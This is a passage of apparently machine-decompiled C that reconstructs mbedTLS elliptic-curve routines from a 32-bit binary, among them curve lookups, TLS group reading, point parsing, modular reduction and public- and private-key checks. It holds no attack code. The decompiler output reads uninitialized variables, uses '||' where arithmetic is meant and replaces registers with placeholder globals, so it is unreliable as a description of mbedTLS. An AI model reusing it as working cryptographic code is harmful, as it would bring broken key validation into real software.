        mbedtls_mpi_free((int32_t *)g3);
        g3 = v1;
        g7 = v3;
        g5 = v5;
        return result3;
    }
    // 0x805ba92
    int32_t v11;
    mbedtls_asn1_write_len(&v10, v8, (char)(int32_t)&v11);
    int32_t v12 = mbedtls_asn1_write_tag(&v10, v8, 48); // 0x805baaa
    g1 = v12;
    int32_t result4; // 0x805b9fb
    if (v12 >= 0) {
        // 0x805bab7
        int32_t v13;
        int32_t v14 = &v13; // 0x805babd_4
        memcpy((char *)a5, (char *)&v2, v14);
        *a6 = v14;
        g1 = 0;
        result4 = 0;
        // branch -> 0x805b9fb
    } else {
        result4 = v12;
    }
    // 0x805b9fb
    g1 = mbedtls_mpi_free((int32_t *)g7);
    mbedtls_mpi_free((int32_t *)g3);
    g3 = v1;
    g7 = v3;
    g5 = v5;
    return result4;
}

// Address range: 0x805baf0 - 0x805bb3f
int32_t mbedtls_ecdsa_write_signature_det(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t result = mbedtls_ecdsa_write_signature((char *)a1, a6, a2, a3, a4, (int32_t *)a5); // 0x805bb2f
    g1 = result;
    int32_t v1;
    g2 = v1;
    return result;
}

// Address range: 0x805bb40 - 0x805bb4f
int32_t mbedtls_ecp_curve_list(void) {
    // 0x805bb40
    g1 = &g43;
    int32_t v1;
    g2 = v1;
    return &g43;
}

// Address range: 0x805bb50 - 0x805bb96
int32_t mbedtls_ecp_grp_id_list(void) {
    // 0x805bb50
    if (g213 == 0) {
        // 0x805bb5c
        g6 = (int32_t)&g43 + 12;
        *(int32_t *)(int32_t)&g217 = 5;
        int32_t v1 = g6; // 0x805bb72
        int32_t v2 = *(int32_t *)v1; // 0x805bb72
        g4 = v2;
        int32_t v3 = 1; // 0x805bb74
        // branch -> 0x805bb68
        while (v2 != 0) {
            // 0x805bb68
            g6 = v1 + 12;
            *(int32_t *)(4 * v3 + (int32_t)&g217) = v2;
            v1 = g6;
            v2 = *(int32_t *)v1;
            g4 = v2;
            v3++;
            // continue -> 0x805bb68
        }
        // 0x805bb7b
        *(int32_t *)(4 * v3 + (int32_t)&g217) = 0;
        g213 = 1;
        // branch -> 0x805bb90
    }
    // 0x805bb90
    g1 = &g217;
    return &g217;
}

// Address range: 0x805bb97 - 0x805bb9f
int32_t function_805bb97(int32_t a1) {
    // 0x805bb97
    return g7;
}

// Address range: 0x805bba0 - 0x805bbcf
int32_t mbedtls_ecp_curve_info_from_grp_id(int32_t a1, int32_t a2) {
    // 0x805bba0
    if (a1 == 5) {
        // 0x805bbc7
        return &g43;
    }
    int32_t v1 = &g43; // 0x805bbbc
    int32_t result; // 0x805bbbc
    while (true) {
        // 0x805bbbc
        result = v1 + 12;
        int32_t v2 = *(int32_t *)result; // 0x805bbbf
        if (v2 == 0) {
            // 0x805bbc5
            // branch -> 0x805bbc7
            // 0x805bbc7
            return 0;
        }
        // 0x805bbb8
        if (v2 == a1) {
            // break -> 0x805bbc7
            break;
        }
        v1 = result;
        // continue -> 0x805bbbc
    }
    // 0x805bbc7
    // branch -> 0x805bbc7
    // 0x805bbc7
    return result;
}

// Address range: 0x805bbd0 - 0x805bbff
int32_t mbedtls_ecp_curve_info_from_tls_id(uint32_t a1) {
    // 0x805bbd0
    g1 = &g43;
    uint32_t v1 = a1 % 0x10000; // 0x805bbd8
    if (v1 == 25) {
        // 0x805bbf9
        return &g43;
    }
    int32_t v2 = &g43; // 0x805bbee
    int32_t result; // 0x805bbee
    while (true) {
        // 0x805bbee
        result = v2 + 12;
        g1 = result;
        if (*(int32_t *)result == 0) {
            // 0x805bbf7
            g1 = 0;
            // branch -> 0x805bbf9
            // 0x805bbf9
            return 0;
        }
        // 0x805bbe8
        if ((int32_t)*(int16_t *)(v2 + 16) == v1) {
            // break -> 0x805bbf9
            break;
        }
        v2 = result;
        // continue -> 0x805bbee
    }
    // 0x805bbf9
    // branch -> 0x805bbf9
    // 0x805bbf9
    return result;
}

// Address range: 0x805bc60 - 0x805bc9f
int32_t mbedtls_ecp_point_init(int32_t a1) {
    // 0x805bc60
    int32_t result; // 0x805bc8c
    if (a1 != 0) {
        // 0x805bc6e
        mbedtls_mpi_init((int32_t *)a1);
        mbedtls_mpi_init((int32_t *)(a1 + 12));
        int32_t v1;
        result = mbedtls_mpi_init((int32_t *)v1);
        g1 = result;
        // branch -> 0x805bc98
    }
    // 0x805bc98
    return result;
}

// Address range: 0x805bca0 - 0x805bd3f
int32_t mbedtls_ecp_tls_read_group(int32_t a1, int32_t a2, uint32_t a3) {
    int32_t v1 = g3; // bp-12
    g6 = a1;
    int32_t v2 = g7; // 0x805bcb0
    int32_t result = -0x4f80;
    int32_t v3;
    if (a3 > 2) {
        int32_t * v4 = (int32_t *)a2; // 0x805bcd0_0
        int32_t v5 = *v4; // 0x805bcd0
        *v4 = v5 + 1;
        if (*(char *)v5 == 3) {
            // 0x805bcdf
            *(int32_t *)a2 = v5 + 2;
            unsigned char v6 = *(char *)(v5 + 2); // 0x805bce8
            *(int32_t *)a2 = v5 + 3;
            g1 = &g43;
            int32_t v7 = (int32_t)v6 | 256 * (int32_t)*(char *)(v5 + 1); // 0x805bcf9
            int32_t v8; // 0x805bd22
            if (v7 == 25) {
              lab_0x805bd37:
                // 0x805bd37
                v8 = 5;
                // branch -> 0x805bd22
            } else {
                int32_t v9 = &g43; // 0x805bd0e
                int32_t v10; // 0x805bd0e
                int32_t v11; // 0x805bd11
                while (true) {
                    // 0x805bd0e
                    v10 = v9 + 12;
                    g1 = v10;
                    v11 = *(int32_t *)v10;
                    if (v11 == 0) {
                        // 0x805bcbe
                        result = -0x4e80;
                        // branch -> 0x805bcbe
                        // 0x805bcbe
                        g1 = result;
                        g3 = v1;
                        g7 = v2;
                        g2 = v3;
                        return result;
                    }
                    // 0x805bd08
                    if (v7 == (int32_t)*(int16_t *)(v9 + 16)) {
                        // break -> 0x805bd1e
                        break;
                    }
                    v9 = v10;
                    // continue -> 0x805bd0e
                }
                // 0x805bd1e
                if (v10 == 0) {
                    result = -0x4e80;
                    // 0x805bcbe
                    g1 = result;
                    g3 = v1;
                    g7 = v2;
                    g2 = v3;
                    return result;
                }
                v8 = v11;
            }
            // 0x805bd22
            g3 = v1;
            g7 = v2;
            int32_t v12;
            g1 = mbedtls_ecp_group_load((int32_t *)v3, v12, g6, v8, a3, 0, 0, 0, 0);
            // branch -> 0x805bd37
            goto lab_0x805bd37;
        } else {
            result = -0x4f80;
        }
    }
    // 0x805bcbe
    g1 = result;
    g3 = v1;
    g7 = v2;
    g2 = v3;
    return result;
}

// Address range: 0x805bd40 - 0x805bd5f
int32_t mbedtls_ecp_group_copy(int32_t a1) {
    // 0x805bd40
    int32_t v1;
    int32_t v2 = *(int32_t *)v1; // 0x805bd49
    g1 = v2;
    int32_t v3;
    int32_t v4;
    int32_t result = mbedtls_ecp_group_load((int32_t *)v4, v3, a1, v2, 0, 0, 0, 0, 0); // 0x805bd4f
    g1 = result;
    return result;
}

// Address range: 0x805bd60 - 0x805bdbf
int32_t mbedtls_ecp_set_zero(int32_t a1) {
    int32_t v1 = g3; // bp-8
    g3 = a1;
    int32_t v2 = mbedtls_mpi_lset((char *)a1, 1); // 0x805bd75
    g1 = v2;
    int32_t result2 = v2; // 0x805bd83_2
    int32_t v3;
    if (v2 == 0) {
        int32_t v4 = mbedtls_mpi_lset((char *)(g3 + 12), 1); // 0x805bd96
        g1 = v4;
        if (v4 == 0) {
            int32_t v5 = g3 + 24; // 0x805bd9f
            g3 = v5;
            int32_t result = mbedtls_mpi_lset((char *)v5, 0); // 0x805bdad
            g1 = result;
            g3 = v1;
            g2 = v3;
            return result;
        }
        result2 = v4;
    }
    // 0x805bd7e
    g3 = v1;
    g2 = v3;
    return result2;
}

// Address range: 0x805bdc0 - 0x805be3f
int32_t mbedtls_ecp_point_read_string(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = g3; // 0x805bdc6
    int32_t v2 = g7; // 0x805bdcc
    g3 = a1;
    g7 = a2;
    int32_t v3 = g5; // 0x805bdd5
    g5 = a4;
    int32_t v4 = mbedtls_mpi_read_string((char *)a1, a2, (char *)a3); // 0x805bde6
    g1 = v4;
    int32_t result2 = v4; // 0x805bdfb_2
    int32_t v5;
    if (v4 == 0) {
        int32_t v6 = mbedtls_mpi_read_string((char *)(g3 + 12), g7, (char *)g5); // 0x805be0e
        g1 = v6;
        if (v6 == 0) {
            // 0x805be17
            g7 = v2;
            g5 = v3;
            g3 = v1;
            int32_t v7;
            int32_t result = mbedtls_mpi_lset((char *)v5, v7); // 0x805be30
            g1 = result;
            return result;
        }
        result2 = v6;
    }
    // 0x805bdef
    g3 = v1;
    g7 = v2;
    g5 = v3;
    g2 = v5;
    return result2;
}

// Address range: 0x805be40 - 0x805be7f
int32_t mbedtls_ecp_point_free(int32_t a1) {
    int32_t v1 = g3; // 0x805be43
    g3 = a1;
    int32_t result; // 0x805be6c
    if (a1 != 0) {
        // 0x805be4e
        mbedtls_mpi_free((int32_t *)a1);
        int32_t v2 = g3; // 0x805be56
        int32_t v3 = v2 + 12; // 0x805be56
        g1 = v3;
        g3 = v2 + 24;
        g1 = mbedtls_mpi_free((int32_t *)v3);
        g3 = v1;
        int32_t v4;
        result = mbedtls_mpi_free((int32_t *)v4);
        g1 = result;
        // branch -> 0x805be78
    }
    // 0x805be78
    g3 = v1;
    return result;
}

// Address range: 0x805be80 - 0x805bea5
int32_t mbedtls_ecp_is_zero(int32_t a1) {
    int32_t result = mbedtls_mpi_cmp_int(a1 + 24, 0) == 0; // 0x805be9f
    g1 = result;
    return result;
}

// Address range: 0x805bea6 - 0x805beaf
int32_t function_805bea6(int32_t a1) {
    // 0x805bea6
    return g7;
}

// Address range: 0x805beb0 - 0x805bf5f
int32_t mbedtls_ecp_check_privkey(int32_t a1, int32_t a2) {
    int32_t v1 = g3; // 0x805bebb
    g3 = a1;
    int32_t v2 = g7; // 0x805bec1
    g7 = a2;
    int32_t v3 = *(int32_t *)(a1 + 48); // 0x805bec7
    g6 = v3;
    if (v3 == 0) {
        // 0x805beee
        g3 = v1;
        g7 = v2;
        return -0x4f80;
    }
    // 0x805bece
    if (*(int32_t *)(a1 + 60) == 0) {
        // 0x805bef8
        if (mbedtls_mpi_get_bit(a2, 0) == 0) {
            // 0x805bf0c
            if (mbedtls_mpi_get_bit(g7, 1) == 0) {
                // 0x805bf20
                if (mbedtls_mpi_get_bit(g7, 2) == 0) {
                    // 0x805bf34
                    if (mbedtls_mpi_bitlen(g7, 2) - 1 == *(int32_t *)(g3 + 92)) {
                        // 0x805bf44
                        // branch -> 0x805beee
                        // 0x805beee
                        g3 = v1;
                        g7 = v2;
                        return 0;
                    }
                }
            }
        }
    } else {
        // 0x805bed5
        if (mbedtls_mpi_cmp_int(a2, 1) > 0) {
            int32_t v4 = g3 + 76; // 0x805bf48
            g3 = v4;
            if (mbedtls_mpi_cmp_mpi((int32_t *)g7, (int32_t *)v4) <= 0) {
                // 0x805bf5b
                // branch -> 0x805beee
                // 0x805beee
                g3 = v1;
                g7 = v2;
                return 0;
            }
            // 0x805bee9
            // branch -> 0x805beee
            // 0x805beee
            g3 = v1;
            g7 = v2;
            return -0x4c80;
        }
    }
    // 0x805bee9
    // branch -> 0x805beee
    // 0x805beee
    g3 = v1;
    g7 = v2;
    return -0x4c80;
}

// Address range: 0x805bf60 - 0x805c03f
int32_t mbedtls_ecp_point_read_binary(int32_t a1, int32_t a2, char * a3, int32_t a4) {
    // 0x805bf60
    int32_t v1;
    int32_t v2 = v1; // bp-4
    int32_t v3 = a1;
    g2 = &v2;
    int32_t v4 = g3; // 0x805bf66
    g3 = a4;
    int32_t v5 = g7; // 0x805bf6c
    int32_t v6 = g5; // 0x805bf72
    g7 = (int32_t)a3;
    g5 = a2;
    int32_t v7; // 0x805bf8e
    if (a4 != 0) {
        // 0x805bf7f
        int32_t v8; // 0x805bff5
        int32_t v9; // 0x805c013
        int32_t result; // 0x805bf9a_2
        int32_t v10;
        int32_t v11; // 0x805c023
        int32_t v12; // 0x805c029
        if (*a3 == 0) {
            // 0x805bf84
            if (a4 == 1) {
                // 0x805bfc8
                v3 = a2;
                g3 = v4;
                g7 = v5;
                g5 = v6;
                // branch -> 0x805bfdc
                // 0x805bfdc
                if ((2 * mbedtls_ecp_set_zero(v1) || 1) == g3) {
                    // 0x805bfe4
                    *(int32_t *)(g2 - 28) = g6;
                    v8 = mbedtls_mpi_read_binary(v2, (char *)v10, v3);
                    result = v8;
                    if (v8 == 0) {
                        // 0x805c001
                        v9 = mbedtls_mpi_read_binary(v2, (char *)v10, v3);
                        if (v9 == 0) {
                            // 0x805c020
                            v11 = g2;
                            g3 = *(int32_t *)(v11 - 12);
                            *(int32_t *)(v11 + 8) = g5 + 24;
                            v12 = g2;
                            g7 = *(int32_t *)(v12 - 8);
                            *(int32_t *)(v12 + 12) = 1;
                            g5 = *(int32_t *)(g2 - 4);
                            return mbedtls_mpi_lset((char *)v3, a2);
                        }
                        result = v9;
                    }
                    // 0x805bf8e
                    v7 = g2;
                    g3 = *(int32_t *)(v7 - 12);
                    g7 = *(int32_t *)(v7 - 8);
                    g5 = *(int32_t *)(v7 - 4);
                    return result;
                }
            }
            // 0x805bf89
            // branch -> 0x805bf8e
            // 0x805bf8e
            v7 = g2;
            g3 = *(int32_t *)(v7 - 12);
            g7 = *(int32_t *)(v7 - 8);
            g5 = *(int32_t *)(v7 - 4);
            return -0x4f80;
        }
        int32_t v13 = mbedtls_mpi_size(a1 + 4); // 0x805bfa6
        g6 = v13;
        if (*(char *)g7 != 4) {
            // 0x805bfb2
            g3 = v4;
            g7 = v5;
            g5 = v6;
            return -0x4e80;
        }
        // 0x805bfdc
        if ((2 * v13 || 1) == g3) {
            // 0x805bfe4
            *(int32_t *)(g2 - 28) = g6;
            v8 = mbedtls_mpi_read_binary(v2, (char *)v10, v3);
            result = v8;
            if (v8 == 0) {
                // 0x805c001
                v9 = mbedtls_mpi_read_binary(v2, (char *)v10, v3);
                if (v9 == 0) {
                    // 0x805c020
                    v11 = g2;
                    g3 = *(int32_t *)(v11 - 12);
                    *(int32_t *)(v11 + 8) = g5 + 24;
                    v12 = g2;
                    g7 = *(int32_t *)(v12 - 8);
                    *(int32_t *)(v12 + 12) = 1;
                    g5 = *(int32_t *)(g2 - 4);
                    return mbedtls_mpi_lset((char *)v3, a2);
                }
                result = v9;
            }
            // 0x805bf8e
            v7 = g2;
            g3 = *(int32_t *)(v7 - 12);
            g7 = *(int32_t *)(v7 - 8);
            g5 = *(int32_t *)(v7 - 4);
            return result;
        }
    }
    // 0x805bf89
    // branch -> 0x805bf8e
    // 0x805bf8e
    v7 = g2;
    g3 = *(int32_t *)(v7 - 12);
    g7 = *(int32_t *)(v7 - 8);
    g5 = *(int32_t *)(v7 - 4);
    return -0x4f80;
}

// Address range: 0x805c0c0 - 0x805c1cf
int32_t ecp_modp(int32_t a1, int32_t a2) {
    int32_t v1 = g3; // 0x805c0c6
    int32_t v2 = g1; // 0x805c0c9
    g3 = v2;
    int32_t v3 = g7; // 0x805c0cb
    int32_t v4 = g6; // 0x805c0ce
    g7 = v4;
    int32_t v5 = g5; // 0x805c0d0
    int32_t result4; // 0x805c106_2
    if (*(int32_t *)(v4 + 100) == 0) {
        int32_t v6 = v4 + 4; // 0x805c1b0
        g7 = v6;
        result4 = mbedtls_mpi_mod_mpi(v2, v2, v6);
        // branch -> 0x805c0fa
    } else {
        int32_t v7 = *(int32_t *)v2; // 0x805c0de
        g5 = v7;
        int32_t v8; // 0x805c0ef
        int32_t result3; // 0x805c0e7
        int32_t v9; // 0x805c148
        int32_t result;
        int32_t v10; // 0x805c0ec
        if (v7 < 0) {
            // 0x805c158
            if (mbedtls_mpi_cmp_int(v2, 0) == 0) {
                // 0x805c158
                // branch -> 0x805c0e4
                // 0x805c0e4
                result3 = mbedtls_mpi_bitlen(g3, 0);
                g1 = result3;
                v10 = g7;
                v8 = 2 * *(int32_t *)(v10 + 88);
                g6 = v8;
                g237 = result3 == v8;
                if (result3 <= v8) {
                    // 0x805c108
                    ((int32_t (*)(int32_t))*(int32_t *)(v10 + 100))(g3);
                    g5 = result3;
                    if (result3 == 0) {
                        // 0x805c118
                        g7 += 4;
                        // branch -> 0x805c148
                        while (true) {
                            // 0x805c148
                            v9 = g3;
                            if (*(int32_t *)v9 < 0) {
                              lab_0x805c120:
                                // 0x805c120
                                if (mbedtls_mpi_cmp_int(v9, 0) != 0) {
                                    int32_t * v11 = (int32_t *)g3;
                                    if (mbedtls_mpi_add_mpi(v11, v11, (int32_t *)g7) != 0) {
                                        // break -> 0x805c0fa
                                        break;
                                    }
                                    // continue -> 0x805c148
                                    continue;
                                }
                            }
                            int32_t result2; // 0x805c183
                            while (true) {
                                // 0x805c190
                                if (mbedtls_mpi_cmp_mpi((int32_t *)g3, (int32_t *)g7) <= 0) {
                                    // 0x805c1a0
                                    result = g5;
                                    // branch -> 0x805c1a0
                                    // 0x805c1a0
                                    g3 = v1;
                                    g7 = v3;
                                    g5 = v5;
                                    return result;
                                }
                              lab_0x805c178:;
                                int32_t v12 = g3; // 0x805c17c
                                result2 = mbedtls_mpi_sub_abs((int32_t *)v12, v12, g7);
                                if (result2 != 0) {
                                    // break -> 0x805c0fa
                                    break;
                                }
                                // continue -> 0x805c190
                            }
                            // 0x805c0fa
                            g3 = v1;
                            g7 = v3;
                            g5 = v5;
                            return result2;
                        }
                    }
                    // 0x805c1a0
                    g3 = v1;
                    g7 = v3;
                    g5 = v5;
                    return result3;
                }
            }
        } else {
            // 0x805c0e4
            int32_t v13;
            result3 = mbedtls_mpi_bitlen(v2, v13);
            g1 = result3;
            v10 = g7;
            v8 = 2 * *(int32_t *)(v10 + 88);
            g6 = v8;
            g237 = result3 == v8;
            if (result3 <= v8) {
                // 0x805c108
                ((int32_t (*)(int32_t))*(int32_t *)(v10 + 100))(g3);
                g5 = result3;
                if (result3 == 0) {
                    // 0x805c118
                    g7 += 4;
                    // branch -> 0x805c148
                    while (true) {
                        // 0x805c148
                        v9 = g3;
                        if (*(int32_t *)v9 < 0) {
                            goto lab_0x805c120;
                        }
                        while (true) {
                            // 0x805c190
                            if (mbedtls_mpi_cmp_mpi((int32_t *)g3, (int32_t *)g7) > 0) {
                                goto lab_0x805c178;
                            }
                            // 0x805c1a0
                            result = g5;
                            // branch -> 0x805c1a0
                            // 0x805c1a0
                            g3 = v1;
                            g7 = v3;
                            g5 = v5;
                            return result;
                        }
                    }
                }
                // 0x805c1a0
                g3 = v1;
                g7 = v3;
                g5 = v5;
                return result3;
            }
        }
        // 0x805c0f5
        result4 = -0x4f80;
        // branch -> 0x805c0fa
    }
    // 0x805c0fa
    g3 = v1;
    g7 = v3;
    g5 = v5;
    return result4;
}

// Address range: 0x805c1d0 - 0x805c46f
int32_t mbedtls_ecp_check_pubkey(int32_t a1, int32_t a2) {
    int32_t v1 = g7; // 0x805c1d6
    g7 = a2;
    int32_t v2 = g3; // 0x805c1dc
    g3 = a1;
    int32_t v3 = g5; // 0x805c1e2
    if (mbedtls_mpi_cmp_int(a2 + 24, 1) != 0) {
        // 0x805c228
        // branch -> 0x805c22d
        // 0x805c22d
        g3 = v2;
        g7 = v1;
        g5 = v3;
        return -0x4c80;
    }
    int32_t v4 = g3; // 0x805c1fc
    int32_t v5 = *(int32_t *)(v4 + 48); // 0x805c1fc
    g4 = v5;
    int32_t result5; // 0x805c239_2
    if (v5 != 0) {
        int32_t v6 = g7; // 0x805c240
        if (*(int32_t *)(v4 + 60) == 0) {
            int32_t v7 = mbedtls_mpi_size(v6); // 0x805c243
            uint32_t v8 = (*(int32_t *)(g3 + 92) + 7) / 8; // 0x805c24e
            g6 = v8;
            g4 = v7;
            if (v7 <= v8) {
                // 0x805c22d
                g3 = v2;
                g7 = v1;
                g5 = v3;
                return 0;
            }
        } else {
            // 0x805c20f
            if (mbedtls_mpi_cmp_int(v6, 0) > 0) {
                int32_t v9 = g7 + 12; // 0x805c25b
                if (mbedtls_mpi_cmp_int(v9, 0) >= 0) {
                    int32_t v10 = g3 + 4; // 0x805c275
                    int32_t * v11 = (int32_t *)v10;
                    if (mbedtls_mpi_cmp_mpi((int32_t *)g7, v11) <= 0) {
                        int32_t * v12 = (int32_t *)v9;
                        if (mbedtls_mpi_cmp_mpi(v12, v11) <= 0) {
                            // 0x805c2a1
                            int32_t v13;
                            int32_t v14 = &v13; // 0x805c2a1_0
                            int32_t v15;
                            int32_t result = &v15; // 0x805c2a4_0
                            g5 = result;
                            mbedtls_mpi_init(&v13);
                            mbedtls_mpi_init((int32_t *)g5);
                            int32_t v16 = mbedtls_mpi_mul_mpi(&v13, v12, v12); // 0x805c2c8
                            g1 = v16;
                            int32_t result3 = v16; // 0x805c2d4
                            if (v16 == 0) {
                                // 0x805c2ef
                                g6 = g3;
                                g1 = v14;
                                int32_t v17 = ecp_modp(v14, v9); // 0x805c2f4
                                g1 = v17;
                                if (v17 == 0) {
                                    // 0x805c2fd
                                    g216++;
                                    int32_t v18 = g7; // 0x805c304
                                    int32_t v19 = g5; // 0x805c30c
                                    int32_t * v20 = (int32_t *)v18;
                                    int32_t v21 = mbedtls_mpi_mul_mpi((int32_t *)v19, v20, v20); // 0x805c30f
                                    g1 = v21;
                                    if (v21 == 0) {
                                        // 0x805c318
                                        g6 = g3;
                                        g1 = result;
                                        int32_t v22 = ecp_modp(v19, v18); // 0x805c31c
                                        g1 = v22;
                                        if (v22 == 0) {
                                            // 0x805c325
                                            g216++;
                                            int32_t v23 = g3; // 0x805c32c
                                            int32_t v24; // 0x805c3f3
                                            int32_t v25; // 0x805c3d5
                                            int32_t v26; // 0x805c3e6
                                            int32_t v27; // 0x805c408
                                            int32_t result2; // 0x805c431
                                            int32_t * v28;
                                            int32_t * v29;
                                            int32_t v30; // 0x805c3ce
                                            int32_t v31; // 0x805c42a
                                            if (*(int32_t *)(v23 + 24) == 0) {
                                                int32_t v32 = g5; // 0x805c380
                                                int32_t v33 = mbedtls_mpi_sub_int(v32, v32, 3); // 0x805c387
                                                g1 = v33;
                                                if (v33 == 0) {
                                                    while (true) {
                                                        // 0x805c394
                                                        if (v15 <= 0) {
                                                            // 0x805c39a
                                                            if (mbedtls_mpi_cmp_int(g5, 0) != 0) {
                                                                int32_t * v34 = (int32_t *)g5;
                                                                int32_t v35 = mbedtls_mpi_add_mpi(v34, v34, v11); // 0x805c3bc
                                                                g1 = v35;
                                                                if (v35 != 0) {
                                                                    result3 = v35;
                                                                    // break -> 0x805c2d1
                                                                    break;
                                                                }
                                                                // continue -> 0x805c394
                                                                continue;
                                                            }
                                                        }
                                                        // 0x805c3ca
                                                        v30 = g5;
                                                        v28 = (int32_t *)v30;
                                                        v25 = mbedtls_mpi_mul_mpi(v28, v28, (int32_t *)g7);
                                                        g1 = v25;
                                                        if (v25 == 0) {
                                                            // 0x805c3e2
                                                            g6 = g3;
                                                            g1 = result;
                                                            v26 = ecp_modp(v30, v30);
                                                            g1 = v26;
                                                            if (v26 == 0) {
                                                                // 0x805c3f3
                                                                v24 = g3 + 28;
                                                                g3 = v24;
                                                                g216++;
                                                                v29 = (int32_t *)g5;
                                                                v27 = mbedtls_mpi_add_mpi(v29, v29, (int32_t *)v24);
                                                                g3 = result;
                                                                if (v27 != 0) {
                                                                    // 0x805c45d
                                                                    g1 = result;
                                                                    // branch -> 0x805c2d1
                                                                    // 0x805c2d1
                                                                    g6 = v14;
                                                                    g1 = mbedtls_mpi_free(&v13);
                                                                    mbedtls_mpi_free((int32_t *)g5);
                                                                    // branch -> 0x805c22d
                                                                    // 0x805c22d
                                                                    g3 = v2;
                                                                    g7 = v1;
                                                                    g5 = v3;
                                                                    return result;
                                                                }
                                                                // 0x805c413
                                                                g7 = v10;
                                                                if (mbedtls_mpi_cmp_mpi((int32_t *)g5, v11) < 0) {
                                                                    // 0x805c43f
                                                                    mbedtls_mpi_cmp_mpi(&v13, (int32_t *)g5);
                                                                    g1 = -0x4c80;
                                                                    // branch -> 0x805c2d1
                                                                    // 0x805c2d1
                                                                    g6 = v14;
                                                                    g1 = mbedtls_mpi_free(&v13);
                                                                    mbedtls_mpi_free((int32_t *)g5);
                                                                    // branch -> 0x805c22d
                                                                    // 0x805c22d
                                                                    g3 = v2;
                                                                    g7 = v1;
                                                                    g5 = v3;
                                                                    return -0x4c80;
                                                                }
                                                                while (true) {
                                                                    // 0x805c426
                                                                    v31 = g5;
                                                                    result2 = mbedtls_mpi_sub_abs((int32_t *)v31, v31, g7);
                                                                    g1 = result2;
                                                                    if (result2 == 0) {
                                                                      lab_0x805c426:
                                                                        // 0x805c426
                                                                        if (mbedtls_mpi_cmp_mpi((int32_t *)g5, (int32_t *)g7) < 0) {
                                                                            // break -> 0x805c43f
                                                                            break;
                                                                        }
                                                                        // continue -> 0x805c426
                                                                        continue;
                                                                    }
                                                                }
                                                                // 0x805c43f
                                                                mbedtls_mpi_cmp_mpi(&v13, (int32_t *)g5);
                                                                g1 = -0x4c80;
                                                                // branch -> 0x805c2d1
                                                                // 0x805c2d1
                                                                g6 = v14;
                                                                g1 = mbedtls_mpi_free(&v13);
                                                                mbedtls_mpi_free((int32_t *)g5);
                                                                // branch -> 0x805c22d
                                                                // 0x805c22d
                                                                g3 = v2;
                                                                g7 = v1;
                                                                g5 = v3;
                                                                return -0x4c80;
                                                            }
                                                            result3 = v26;
                                                        } else {
                                                            result3 = v25;
                                                        }
                                                    }
                                                } else {
                                                    result3 = v33;
                                                }
                                            } else {
                                                int32_t * v36 = (int32_t *)g5;
                                                int32_t v37 = mbedtls_mpi_add_mpi(v36, v36, (int32_t *)(v23 + 16)); // 0x805c340
                                                g1 = v37;
                                                if (v37 == 0) {
                                                    int32_t result4; // 0x805c36a
                                                    while (true) {
                                                        // 0x805c349
                                                        if (mbedtls_mpi_cmp_mpi((int32_t *)g5, v11) < 0) {
                                                            // 0x805c3ca
                                                            v30 = g5;
                                                            v28 = (int32_t *)v30;
                                                            v25 = mbedtls_mpi_mul_mpi(v28, v28, (int32_t *)g7);
                                                            g1 = v25;
                                                            if (v25 == 0) {
                                                                // 0x805c3e2
                                                                g6 = g3;
                                                                g1 = result;
                                                                v26 = ecp_modp(v30, v30);
                                                                g1 = v26;
                                                                if (v26 == 0) {
                                                                    // 0x805c3f3
                                                                    v24 = g3 + 28;
                                                                    g3 = v24;
                                                                    g216++;
                                                                    v29 = (int32_t *)g5;
                                                                    v27 = mbedtls_mpi_add_mpi(v29, v29, (int32_t *)v24);
                                                                    g3 = result;
                                                                    if (v27 != 0) {
                                                                        // 0x805c45d
                                                                        g1 = result;
                                                                        // branch -> 0x805c2d1
                                                                        // 0x805c2d1
                                                                        g6 = v14;
                                                                        g1 = mbedtls_mpi_free(&v13);
                                                                        mbedtls_mpi_free((int32_t *)g5);
                                                                        // branch -> 0x805c22d
                                                                        // 0x805c22d
                                                                        g3 = v2;
                                                                        g7 = v1;
                                                                        g5 = v3;
                                                                        return result;
                                                                    }
                                                                    // 0x805c413
                                                                    g7 = v10;
                                                                    if (mbedtls_mpi_cmp_mpi((int32_t *)g5, v11) < 0) {
                                                                        // 0x805c43f
                                                                        mbedtls_mpi_cmp_mpi(&v13, (int32_t *)g5);
                                                                        g1 = -0x4c80;
                                                                        // branch -> 0x805c2d1
                                                                        // 0x805c2d1
                                                                        g6 = v14;
                                                                        g1 = mbedtls_mpi_free(&v13);
                                                                        mbedtls_mpi_free((int32_t *)g5);
                                                                        // branch -> 0x805c22d
                                                                        // 0x805c22d
                                                                        g3 = v2;
                                                                        g7 = v1;
                                                                        g5 = v3;
                                                                        return -0x4c80;
                                                                    }
                                                                    while (true) {
                                                                        // 0x805c426
                                                                        v31 = g5;
                                                                        result2 = mbedtls_mpi_sub_abs((int32_t *)v31, v31, g7);
                                                                        g1 = result2;
                                                                        if (result2 == 0) {
                                                                            goto lab_0x805c426;
                                                                        }
                                                                        // 0x805c2d1
                                                                        g6 = v14;
                                                                        g1 = mbedtls_mpi_free(&v13);
                                                                        mbedtls_mpi_free((int32_t *)g5);
                                                                        // branch -> 0x805c22d
                                                                        // 0x805c22d
                                                                        g3 = v2;
                                                                        g7 = v1;
                                                                        g5 = v3;
                                                                        return result2;
                                                                    }
                                                                } else {
                                                                    result3 = v26;
                                                                }
                                                            } else {
                                                                result3 = v25;
                                                            }
                                                        } else {
                                                            int32_t v38 = g5; // 0x805c35f
                                                            result4 = mbedtls_mpi_sub_abs((int32_t *)v38, v38, v10);
                                                            g1 = result4;
                                                            if (result4 != 0) {
                                                                // break -> 0x805c2d1
                                                                break;
                                                            }
                                                            // continue -> 0x805c349
                                                            continue;
                                                        }
                                                        // 0x805c2d1
                                                        g6 = v14;
                                                        g1 = mbedtls_mpi_free(&v13);
                                                        mbedtls_mpi_free((int32_t *)g5);
                                                        // branch -> 0x805c22d
                                                        // 0x805c22d
                                                        g3 = v2;
                                                        g7 = v1;
                                                        g5 = v3;
                                                        return result3;
                                                    }
                                                    // 0x805c2d1
                                                    g6 = v14;
                                                    g1 = mbedtls_mpi_free(&v13);
                                                    mbedtls_mpi_free((int32_t *)g5);
                                                    // branch -> 0x805c22d
                                                    // 0x805c22d
                                                    g3 = v2;
                                                    g7 = v1;
                                                    g5 = v3;
                                                    return result4;
                                                }
                                                result3 = v37;
                                            }
                                            // 0x805c2d1
                                            g6 = v14;
                                            g1 = mbedtls_mpi_free(&v13);
                                            mbedtls_mpi_free((int32_t *)g5);
                                            // branch -> 0x805c22d
                                            // 0x805c22d
                                            g3 = v2;
                                            g7 = v1;
                                            g5 = v3;
                                            return result3;
                                        }
                                        result3 = v22;
                                    } else {
                                        result3 = v21;
                                    }
                                } else {
